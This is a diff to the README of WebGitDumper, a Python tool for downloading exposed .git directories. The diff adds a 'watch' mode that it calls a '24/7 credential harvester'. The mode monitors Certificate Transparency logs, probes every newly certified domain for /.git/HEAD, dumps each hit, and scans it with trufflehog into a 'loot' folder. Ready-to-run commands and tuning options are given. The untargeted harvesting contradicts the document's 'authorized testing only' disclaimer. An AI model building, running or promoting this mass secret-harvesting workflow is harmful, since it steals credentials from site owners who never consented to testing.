@@ -1,11 +1,16 @@
 # WebGitDumper
 
-A Python tool for downloading exposed `.git` directories from web servers.
+A Python tool for downloading exposed `.git` directories from web servers, with an
+optional **24/7 watch mode** that hunts for newly issued certificates and dumps
+exposed git repositories the moment they appear.
 
 **For authorized security testing, CTF challenges, and educational purposes only.**
 
 ## Features
 
+- **Two modes**:
+  - `dump` — manually download a single exposed `.git` directory
+  - `watch` — monitor a Certificate Transparency stream and auto-dump every exposed `.git` it finds
 - **Multi-threaded downloads** - Configurable thread count for parallel downloads
 - **Proxy support** - HTTP, HTTPS, and SOCKS5 proxy support
 - **Progress display** - Real-time progress with download statistics
@@ -33,22 +38,25 @@ chmod +x webgitdumper.py
 
 ## Usage
 
-### Basic Usage
+WebGitDumper has two subcommands: `dump` (one target) and `watch` (auto-discover via CT logs).
+
+> **Breaking change**: Previous versions used `webgitdumper.py URL OUTPUT_DIR`. The
+> equivalent now is `webgitdumper.py dump URL OUTPUT_DIR`.
+
+### `dump` — single target
 
 ```bash
 # Download a .git directory
-python webgitdumper.py http://example.com/.git/ ./output
+python webgitdumper.py dump http://example.com/.git/ ./output
 
 # Or just provide the base URL
-python webgitdumper.py http://example.com/ ./output
+python webgitdumper.py dump http://example.com/ ./output
 ```
 
-### Command Line Options
+#### Options
 
 ```
-Usage: webgitdumper.py [OPTIONS] URL OUTPUT_DIR
-
-  WebGitDumper - Download exposed .git directories from web servers.
+Usage: webgitdumper.py dump [OPTIONS] URL OUTPUT_DIR
 
   URL: Target URL (e.g., http://example.com/.git/ or http://example.com/)
   OUTPUT_DIR: Directory to save the downloaded repository
@@ -66,32 +74,102 @@ Options:
   --help                   Show this message and exit
 ```
 
-### Examples
+#### Examples
 
 ```bash
 # Use a proxy (e.g., Burp Suite or thermoptic)
-python webgitdumper.py http://target.com/.git/ ./repo --proxy http://127.0.0.1:8080
+python webgitdumper.py dump http://target.com/.git/ ./repo --proxy http://127.0.0.1:8080
 
 # Use SOCKS5 proxy
-python webgitdumper.py http://target.com/.git/ ./repo --proxy socks5://127.0.0.1:1080
+python webgitdumper.py dump http://target.com/.git/ ./repo --proxy socks5://127.0.0.1:1080
 
 # More threads for faster downloads
-python webgitdumper.py http://target.com/.git/ ./repo --threads 20
+python webgitdumper.py dump http://target.com/.git/ ./repo --threads 20
 
 # Custom user agent
-python webgitdumper.py http://target.com/.git/ ./repo --user-agent "CustomBot/1.0"
+python webgitdumper.py dump http://target.com/.git/ ./repo --user-agent "CustomBot/1.0"
 
 # Disable SSL verification for self-signed certs
-python webgitdumper.py https://target.com/.git/ ./repo --no-verify
+python webgitdumper.py dump https://target.com/.git/ ./repo --no-verify
 
 # Verbose output for debugging
-python webgitdumper.py http://target.com/.git/ ./repo --verbose
+python webgitdumper.py dump http://target.com/.git/ ./repo --verbose
 
 # Quiet mode (errors only)
-python webgitdumper.py http://target.com/.git/ ./repo --quiet
+python webgitdumper.py dump http://target.com/.git/ ./repo --quiet
 
 # Scan dumped repo for secrets across the full git history
-python webgitdumper.py http://target.com/.git/ ./repo --scan-secrets
+python webgitdumper.py dump http://target.com/.git/ ./repo --scan-secrets
+```
+
+### `watch` — 24/7 credential harvester
+
+`watch` subscribes to a Certificate Transparency stream, probes every newly issued
+domain for `/.git/HEAD`, and on each hit runs the full dumper + trufflehog pipeline.
+Findings are persisted as JSONL and the raw repo is deleted after scanning, so the
+output stays small even when running for days.
+
+#### Required infrastructure
+
+You need a running [certstream-server-go](https://github.com/d-Rickyy-b/certstream-server-go)
+instance. The original public Calidog feed (`wss://certstream.calidog.io`) has been broken
+for years and Calidog themselves describe it as "demo only". Self-host with one command:
+
+```bash
+docker run -d --name certstream -p 8080:8080 0rickyy0/certstream-server-go:latest
+```
+
+#### Pipeline
+
+```
+certstream WS  →  [check_queue]   →  N GET-probes  →  [dump_queue]   →  M dumpers + trufflehog
+   producer       (bounded ~10k)     /.git/HEAD       (bounded 500)     → secrets.jsonl, raw deleted
+```
+
+- **Producer**: WebSocket-Thread with auto-reconnect and 30s ping keepalive. Drops domains
+  if the queue is full (we can't keep up anyway).
+- **Probe workers**: GET `https://{domain}/.git/HEAD` with a short timeout, match
+  `ref: refs/heads/` in the body. False-positive-resistant against catch-all SPAs.
+- **Dump workers**: Run the existing `GitDumper` against hits, then trufflehog with
+  `--no-verification`. Findings are appended to `secrets.jsonl`, raw repo deleted.
+- **Dedup**: In-memory set, configurable TTL (default 24h), so the same domain isn't
+  re-checked endlessly when it appears in many certs.
+
+#### Output files
+
+- `hits.jsonl` — every domain where `/.git/HEAD` matched, regardless of whether secrets were found
+- `secrets.jsonl` — every trufflehog finding (one JSON object per line)
+
+#### Examples
+
+```bash
+# Default: watch local certstream-server-go on port 8080
+python webgitdumper.py watch ./loot
+
+# Custom certstream URL and tuned worker counts
+python webgitdumper.py watch ./loot \
+  --certstream-url ws://localhost:8765/full-stream \
+  --check-workers 80 \
+  --dump-workers 5
+
+# Shorter dedup window for testing
+python webgitdumper.py watch ./loot --dedup-ttl 3600
+```
+
+#### Options
+
+```
+Usage: webgitdumper.py watch [OPTIONS] OUTPUT_DIR
+
+Options:
+  --certstream-url TEXT    WebSocket URL of a certstream-server instance
+                           (default: ws://localhost:8080/full-stream)
+  --check-workers INTEGER  Parallel GET probes for /.git/HEAD (default: 55)
+  --dump-workers INTEGER   Parallel full dumps + trufflehog scans (default: 3)
+  --check-timeout INTEGER  Timeout for the /.git/HEAD probe in seconds (default: 5)
+  --dedup-ttl INTEGER      Skip already-seen domains for N seconds (default: 86400)
+  -v, --verbose            Verbose output
+  --help                   Show this message and exit
 ```
 
 ### Secret Scanning
@@ -109,7 +187,7 @@ Findings must be reviewed manually.
 Requires the `trufflehog` binary in `PATH` (`brew install trufflehog`). If not present,
 the scan is skipped with a warning instead of failing.
 
-### After Downloading
+### After Downloading (`dump` mode)
 
 Once the download is complete, you can restore the repository:
 
